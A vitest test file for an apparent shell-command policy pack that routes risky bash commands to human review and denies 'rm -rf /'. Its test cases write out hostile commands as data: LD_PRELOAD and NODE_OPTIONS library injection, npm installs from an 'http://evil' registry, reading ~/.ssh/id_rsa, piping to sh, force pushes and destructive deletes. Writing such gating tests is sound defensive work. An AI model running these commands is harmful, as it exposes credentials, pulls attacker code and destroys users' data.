import { describe, expect, it } from "vitest";

import { bashDevVerifyPack } from "../../src/packs/bash.dev.verify.ts";
import { bashInspectCorePack } from "../../src/packs/bash.inspect.core.ts";
import { bashReviewRiskyPack } from "../../src/packs/bash.review.risky.ts";
import { bashSearchReadPack } from "../../src/packs/bash.search.read.ts";
import { bashVcsReadPack } from "../../src/packs/bash.vcs.read.ts";
import {
  decideWithPacks,
  expectCleanLoadAll,
  expectDecisionEffect,
} from "./helpers.ts";

const readOnlyAndRiskyPacks = [
  bashInspectCorePack,
  bashSearchReadPack,
  bashVcsReadPack,
  bashReviewRiskyPack,
];

describe("bash.review.risky pack", () => {
  it("compiles and loads cleanly against the sealed floor", () => {
    expect(bashReviewRiskyPack).toMatchObject({
      version: 1,
      id: "bash.review.risky",
    });
    expectCleanLoadAll([bashReviewRiskyPack]);
  });

  it.each([
    [
      "LD_PRELOAD=/tmp/evil.so pnpm test",
      "bash.review.risky:review-dangerous-env-assignment",
    ],
    [
      "DYLD_INSERT_LIBRARIES=x ls",
      "bash.review.risky:review-dangerous-env-assignment",
    ],
    [
      "NODE_OPTIONS=--require=/tmp/e.js pnpm test",
      "bash.review.risky:review-dangerous-env-assignment",
    ],
    [
      "npm_config_registry=http://evil npm i",
      "bash.review.risky:review-dangerous-env-assignment",
    ],
    [
      "NPM_CONFIG_REGISTRY=http://evil npm i",
      "bash.review.risky:review-dangerous-env-assignment",
    ],
    [
      "CARGO_TARGET_X86_64_UNKNOWN_LINUX_GNU_RUNNER=/tmp/e cargo test",
      "bash.review.risky:review-dangerous-env-assignment",
    ],
    ["cat file | sh", "bash.review.risky:review-pipe-to-shell"],
    ["echo $(date)", "bash.review.risky:review-substitution"],
    ["cat < ~/.ssh/id_rsa", "bash.review.risky:review-stdin-redirect"],
    ["ls > /etc/x", "bash.review.risky:review-stdout-redirect"],
    ["grep x missing || echo failed", "bash.review.risky:review-or-operator"],
    ["git push --force", "bash.review.risky:review-git-push"],
    ["rm -r build", "bash.review.risky:review-recursive-rm"],
    [
      'for f in src/*.ts; do LD_PRELOAD=/tmp/evil.so cat "$f"; done',
      "bash.review.risky:review-dangerous-env-assignment",
    ],
    [
      'for f in src/*.ts; do env LD_PRELOAD=/tmp/evil.so cat "$f"; done',
      "bash.review.risky:review-dangerous-env-assignment",
    ],
  ])("reviews risky category: %s", async (command, ruleId) => {
    expect(await decideWithPacks(command, [bashReviewRiskyPack])).toMatchObject(
      {
        effect: "review",
        provenance: { packId: "bash.review.risky", ruleId },
      },
    );
  });

  it("keeps a benign final-noop fallback un-named when no allow family is active", async () => {
    const decision = await decideWithPacks("unknowncmd || true", [
      bashReviewRiskyPack,
    ]);
    expect(decision.effect).toBe("review");
    expect(decision.provenance?.ruleId).not.toBe(
      "bash.review.risky:review-or-operator",
    );
  });

  it.each([
    "FOO=1 pnpm test",
    "CI=true cargo test",
    "FOO=1 BAR=2 pnpm test",
  ])("leaves benign environment assignments eligible: %s", async (command) => {
    expect(
      await decideWithPacks(command, [bashDevVerifyPack, bashReviewRiskyPack]),
    ).toMatchObject({ effect: "allow" });
  });

  it.each([
    "git reset --hard",
    "git clean -ffdx",
    "git branch -D old",
    "git checkout -B new",
    "git worktree remove ../wt",
  ])("reviews destructive git variant: %s", async (command) => {
    expect(await decideWithPacks(command, [bashReviewRiskyPack])).toMatchObject(
      {
        effect: "review",
        provenance: { packId: "bash.review.risky" },
      },
    );
  });

  it("reviews backgrounding even when parser diagnostics preempt active rules", async () => {
    // Backgrounding currently emits parser diagnostics, so the interpreter returns the
    // default diagnostic review before active policy. The pack rule is retained as a
    // backstop for future parser support.
    expect(await decideWithPacks("ls &", [bashReviewRiskyPack])).toMatchObject({
      effect: "review",
    });
  });

  it("keeps sealed floor precedence over risky review rules", async () => {
    await expectDecisionEffect("rm -rf /", bashReviewRiskyPack, "deny");
  });

  it.each([
    "cat file | sh",
    "git status $(date)",
    "git push --force",
  ])("review outranks sibling allows for %s", async (command) => {
    expect(await decideWithPacks(command, readOnlyAndRiskyPacks)).toMatchObject(
      {
        effect: "review",
        provenance: { packId: "bash.review.risky" },
      },
    );
  });

  it("backgrounding reviews before sibling allows via parser diagnostics", async () => {
    expect(await decideWithPacks("ls &", readOnlyAndRiskyPacks)).toMatchObject({
      effect: "review",
    });
  });

  // Compound-body gates (Sol review, floor-stage-coverage): dangerous stages
  // nested inside a for-loop body must stay gated, never ride compound allows.
  // Rule provenance varies with iterator modeling, so assert the effect.
  it.each([
    'for f in logs/*.log; do tail -f "$f"; done',
    'for f in data/*.csv; do sort -o sorted "$f"; done',
    'for f in src/*.ts; do sed -n "$(pwd)p" "$f"; done',
    "for f in src/*.ts; do find . -delete; done",
  ])("keeps compound-body stage gated: %s", async (command) => {
    expect(await decideWithPacks(command, readOnlyAndRiskyPacks)).toMatchObject(
      {
        effect: "review",
      },
    );
  });
});
